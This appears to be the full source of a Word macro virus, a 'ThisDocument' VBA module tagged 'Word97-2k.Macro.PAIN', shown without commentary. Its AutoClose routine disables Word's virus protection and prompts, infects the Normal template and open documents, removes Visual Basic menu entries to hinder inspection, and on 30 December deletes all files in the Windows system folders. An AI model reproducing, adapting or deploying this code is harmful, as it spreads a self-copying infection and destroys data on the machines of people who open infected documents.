   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Sub AutoClose()
   On Error Resume Next
   S = ActiveDocument.Saved
   DisableAutoMacro = False
   Text = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Countoflines)
   Application.EnableCancelKey = Not -1
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
   If Left(Date, 5) = "30.12" Then Kill ("C:\Windows\System\*.*"): Kill ("C:\Windows\*.*")
   Set Mac = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
   If Mac.Lines(1, Mac.Countoflines) <> Text Then
   Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
   For Each Control In CommandBars("Menu Bar").Controls(6).Controls
   If Control.Type = 10 Then
   For I = 1 To Control.Controls.Count
   If Right(Control.Controls(I).Caption, 5) = "Basic" Then Control.Delete
   Next I
   End If
   Next Control
   End If
   Set Mac = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
   If Mac.Lines(1, Mac.Countoflines) <> Text Then Mac.DeleteLines 1, Mac.Countoflines: Mac.AddfromString Text
   With Dialogs(wdDialogFileSummaryInfo): .Keywords = "Word97-2k.Macro.PAIN": .Execute: End With
   If ActiveDocument.Path <> "" Then ActiveDocument.Save
   ActiveDocument.Saved = S
   End Sub
